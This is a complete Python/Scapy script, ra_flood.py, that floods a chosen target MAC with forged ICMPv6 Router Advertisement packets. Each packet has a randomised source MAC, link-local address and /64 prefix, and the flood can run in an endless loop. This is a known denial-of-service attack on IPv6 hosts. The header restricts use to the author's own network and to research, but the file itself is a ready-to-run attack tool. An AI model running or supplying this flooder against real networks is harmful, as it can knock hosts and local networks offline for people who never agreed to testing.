#! /usr/bin/env python

#############################################################################
##                                                                         ##
## ra_flood.py                                                             ##
##                                                                         ##
## RA Flood (ICMPv6/NDP/RA)                                                ##
## Flood ICMPv6 RA packets                                                 ##
##                                                                         ##
## Use this script only on your own devices and your own network!          ##
## This script is for research and academic purposes only!                 ##
##                                                                         ##
## Author : Benjamin Bachelart <ben@bashy.eu>                              ##
## http://blog.bashy.eu/                                                   ##
##                                                                         ##
## This program is under CC LICENSE 3.0 BY-NC-SA :                         ##
## http://creativecommons.org/licenses/by-nc-sa/3.0/                       ##
##                                                                         ##
## There is NO warranty provided with this software.                       ##
##                                                                         ##
## Type python ra_flood.py --help for syntax                               ##
## Version : 0.2 (2013-07-08)                                              ##
##                                                                         ##
#############################################################################

from scapy.all import *
import sys, getopt, re, time

def usage(): print "Usage: python ra_flood.py [-h | --help] [-v | --verbose] [-c n | --count=n] <interface> <mac_target_addr>\n\nThis script is under CC LICENSE 3.0 BY-NC-SA.\n\nFeel free to report any bug or suggestion to <ben@bashy.eu>."

try:
 opts, args = getopt.getopt(sys.argv[1:], "hvc:", ["help", "verbose", "count="])
except getopt.GetoptError, err:
 print str(err)
 usage()
 exit(1)

# default values for optional parameters
verbose = False
count = 1

for opt, arg in opts:
 if opt in ('-h', '--help'):
  usage()
  exit()
 elif opt in ('-v', '--verbose'):
  verbose = True
 elif opt in ('-c', '--count'):
  if re.match("^[0-9]+$", arg) is None: # check count arg
   print 'Incorrect format for count option, a number is expected, 0 for loop'
   exit(1)
  else: count = int(arg)

# check args
if len(args) != 2: # nb args NOK
 print 'Invalid number of arguments, 2 args expected.'
 usage()
 exit(1)
else: # nb args OK
 if args[0] not in get_if_list(): # check wether interface passed in arg exist.
  print 'Invalid interface.'
  exit(1)
 else: interface = args[0]
 if re.match("^([a-fA-F0-9]{2}(:|-)){5}[a-fA-F0-9]{2}$", args[1]) is None:
  print 'Incorrect format for mac target address.\nOP:QR:ST:UV:WX:YZ format expected.'
  exit(1)
 else: mac_tgt = str.replace(args[1], '-', ':')

ra=ICMPv6ND_RA(M=0, O=0, type=134, code=0, routerlifetime=1800)

i = 0
while(i < count) or (count == 0):
 try:
  ether=Ether(src=Ether.src.randval()._fix(), dst=mac_tgt)
  ip6=IPv6(src=RandIP6('fe80::*:*:*:*')._fix(), dst='ff02::1')
  prefix=ICMPv6NDOptPrefixInfo(L=1, A=1, R=0, prefixlen=64, prefix=RandIP6('*:*:*:*::')._fix(), validlifetime=2592000, preferredlifetime=604800)
  cleanpkt=(ether/ip6/ra/prefix)
  if verbose:
   print "[RA FLOOD] - RA Packet - [MAC] From %s To %s - [IPv6] From %s - [RA Prefix] %s/%i - SENT" % (cleanpkt[Ether].src, cleanpkt[Ether].dst, cleanpkt[IPv6].src, cleanpkt[ICMPv6NDOptPrefixInfo].prefix, cleanpkt[ICMPv6NDOptPrefixInfo].prefixlen)
  sendp(cleanpkt, iface=interface, verbose=0)
  i += 1
  time.sleep(0.01) # Sending interval, feel free to change this param (in second)
 except KeyboardInterrupt:
  print '\n[RA FLOOD] - Program interrupted. %s packet(s) sent.' % (i)
  sys.exit()
print '\n[RA FLOOD] - %s packet(s) sent.' % (i)
